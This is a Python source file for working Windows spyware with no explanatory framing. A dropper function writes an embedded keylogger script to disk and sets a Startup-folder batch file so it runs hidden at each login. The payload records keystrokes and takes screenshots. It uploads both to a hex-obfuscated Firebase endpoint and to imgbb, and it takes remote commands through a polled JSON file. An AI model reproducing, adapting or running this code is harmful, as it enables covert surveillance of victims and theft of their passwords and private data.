import os
import subprocess
import sys

python_code = '''import os
import requests
from datetime import datetime
import socket
import threading
import time
from PIL import ImageGrab
from pynput.keyboard import Listener, Key
from filelock import FileLock, Timeout
import os

nm = ''
try:
    nm = os.getlogin()
except:
    pass

systempy_folder = "C:\\system-logs"
os.chdir(systempy_folder)

fu = '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x72\x6f\x6a\x65\x63\x74\x2d\x72\x75\x6e\x6e\x6e\x65\x72\x2d\x64\x65\x66\x61\x75\x6c\x74\x2d\x72\x74\x64\x62\x2e\x66\x69\x72\x65\x62\x61\x73\x65\x69\x6f\x2e\x63\x6f\x6d\x2f'
os.makedirs('files', exist_ok=True)
log_file = "files/system-files.txt"
hostname = nm+'-'+socket.gethostname()
screenshot_folder = "systemss"
command_path = f'users/{hostname}/command.json'

LOCK_FILE = "files/my_script.lock"

def prevent_multiple_instances():
    lock = FileLock(LOCK_FILE + ".lock")
    try:
        lock.acquire(timeout=0)
        return lock
    except Timeout:
        print("Another instance of this script is already running. Exiting.")
        exit(1)


def is_internet_available():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=5)
        return True
    except (socket.timeout, socket.error):
        return False


def fetch_api_key():
    api_key_path = 'system.json'
    try:
        response = requests.get(fu + api_key_path)
        if response.status_code == 200:
            api_key_data = response.json()
            return api_key_data.get('api_key')
        else:
            return None
    except requests.exceptions.RequestException as e:
        return None


def upload_log():
    with open(log_file, 'r') as file:
        content = file.read().strip()

    command_path = f'users/{hostname}/command.json'
    active_path = f'users/{hostname}/activate.json'
    try:
        active = {'last_login': datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
        response = requests.put(fu + active_path, json=active)
        requests.put(fu + command_path,
                     json={'ss_count': 0, 'log_upload': False})
    except:
        pass

    new_log_marker = f"** New logging started at"
    if content.startswith(new_log_marker) and content.count(new_log_marker) == 1 and len(content.split("\\n")) == 1:
        return False

    if not is_internet_available():
        return False

    db_path = f'users/{hostname}/keylog/{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}.json'

    with open(log_file, 'r') as file:
        file_data = file.read()
    data_to_upload = {'runnner': file_data}

    try:
        response = requests.put(fu + db_path, json=data_to_upload)
        if response.status_code == 200:
            with open(log_file, 'w') as file:
                file.truncate(0)
            add_new_log_marker()
            return True
        else:
            return False
    except requests.exceptions.RequestException as e:
        return False


def add_new_log_marker():
    with open(log_file, 'a') as file:
        file.write(
            f"\\n** New logging started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} **\\n")


def periodic_upload():
    while True:
        if upload_log():
            pass
        else:
            pass
        time.sleep(3600)


def periodic_screenshots():
    os.makedirs(screenshot_folder, exist_ok=True)
    while True:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        screenshot_path = os.path.join(
            screenshot_folder, f"{hostname}_{timestamp}.png")
        try:
            screenshot = ImageGrab.grab()
            screenshot.save(screenshot_path)
            upload_image_to_imgbb(screenshot_path)
            os.remove(screenshot_path)
        except Exception as e:
            pass
        time.sleep(3600)


def upload_image_to_imgbb(image_path):
    api_key = fetch_api_key()
    with open(image_path, 'rb') as image_file:
        files = {'image': image_file}
        params = {'key': api_key}
        response = requests.post(
            'https://api.imgbb.com/1/upload', files=files, params=params)

    if response.status_code == 200:
        response_json = response.json()
        image_url = response_json['data']['url']
    else:
        pass


recent_keys = {}
debounce_time = 0.2


def write_to_file(key):
    current_time = time.time()
    key_str = None
    if hasattr(key, 'char') and key.char:
        key_str = key.char
    elif key == Key.space:
        key_str = "\t"
    elif key == Key.enter:
        key_str = "\\n"
    elif key == Key.backspace:
        key_str = "[BS]"

    if key_str and (current_time - recent_keys.get(key_str, 0)) > debounce_time:
        with open(log_file, "a") as file:
            file.write(key_str)
        recent_keys[key_str] = current_time


def start_listener():
    with Listener(on_press=write_to_file) as listener:
        listener.join()


def ensure_log_exists():
    if not os.path.exists(log_file):
        with open(log_file, 'w') as file:
            pass


def delete_all_files_in_folder(folder_path):
    try:
        if not os.path.exists(folder_path):
            return
        for file_name in os.listdir(folder_path):
            file_path = os.path.join(folder_path, file_name)
            if os.path.isfile(file_path):
                os.remove(file_path)
    except Exception as e:
        pass


def handle_screenshot_interval():
    os.makedirs(screenshot_folder, exist_ok=True)
    while True:
        try:
            response = requests.get(fu + command_path)
            if response.status_code == 200:
                command_data = response.json()

                if command_data is None:
                    command_data = {'ss_count': 0, 'log_upload': True}
                elif 'ss_count' not in command_data:
                    command_data['ss_count'] = 0
                    command_data['log_upload'] = True

                ss_count = command_data.get('ss_count', 0)
                if ss_count > 0:
                    for _ in range(ss_count):
                        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
                        image_path = os.path.join(
                            screenshot_folder, f"{hostname}_{timestamp}.png")
                        try:
                            screenshot = ImageGrab.grab()
                            screenshot.save(image_path)
                            upload_image_to_imgbb(image_path)
                            os.remove(image_path)
                            time.sleep(10)
                        except Exception as e:
                            pass

                    command_data['ss_count'] = max(
                        0, command_data['ss_count'] - ss_count)
                    requests.put(fu + command_path, json=command_data)

            else:
                pass
        except requests.exceptions.RequestException as e:
            pass

        time.sleep(10)
        delete_all_files_in_folder(screenshot_folder)


def check_immediate_upload():
    while True:
        try:
            response = requests.get(fu + command_path)
            if response.status_code == 200:
                command_data = response.json()
                if command_data is None:
                    command_data = {'ss_count': 0, 'log_upload': False}
                elif 'ss_count' not in command_data:
                    command_data['ss_count'] = 0
                    command_data['log_upload'] = False

                log_upload = command_data.get('log_upload', False)
                if log_upload:
                    upload_log()
                    time.sleep(10)
        except:
            pass


def main():
    ensure_log_exists()
    add_new_log_marker()

    listener_thread = threading.Thread(target=start_listener, daemon=True)
    listener_thread.start()

    upload_thread = threading.Thread(target=periodic_upload, daemon=True)
    upload_thread.start()

    log_interval_thread = threading.Thread(
        target=check_immediate_upload, daemon=True)
    log_interval_thread.start()

    screenshot_interval_thread = threading.Thread(
        target=handle_screenshot_interval, daemon=True)
    screenshot_interval_thread.start()

    listener_thread.join()
    upload_thread.join()
    screenshot_interval_thread.join()
    log_interval_thread.join()


lock = prevent_multiple_instances()
try:
    main()
finally:
    lock.release()
'''
def i_am_cute():
    pythonw_path = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
    python_file_name = "system-log.pyw"
    batch_file_name = "start.bat"

    startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    systempy_folder = "C:\\system-logs"
    python_script_dest = os.path.join(systempy_folder, python_file_name)
    batch_file_path = os.path.join(startup_folder, batch_file_name)

    if not os.path.exists(systempy_folder):
        os.makedirs(systempy_folder)
    os.chdir(systempy_folder)

    with open(python_script_dest, "w") as file:
        file.write(python_code)

    batch_file_content = f"""@echo off
    pushd %~dp0
    "{pythonw_path}" "{python_script_dest}"
    exit
    """
    with open(batch_file_path, "w") as file:
        file.write(batch_file_content)

    subprocess.run(batch_file_path, shell=True)